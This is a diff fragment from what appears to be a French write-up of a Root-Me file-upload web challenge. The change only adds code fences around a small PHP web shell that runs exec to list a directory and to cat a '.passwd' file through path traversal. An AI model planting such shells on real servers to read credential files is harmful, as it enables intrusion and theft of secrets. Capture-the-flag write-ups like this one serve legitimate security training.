@@ -77,9 +77,11 @@ echo exec("ls -la");
 
 http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/6d2f513e04f13e82d71dfa6a0884ce46//ls.php
 
+```
 <?php
 echo exec("cat ../../../.passwd");
 ?>
+```
 
 voilà la réponse au challenge :
 
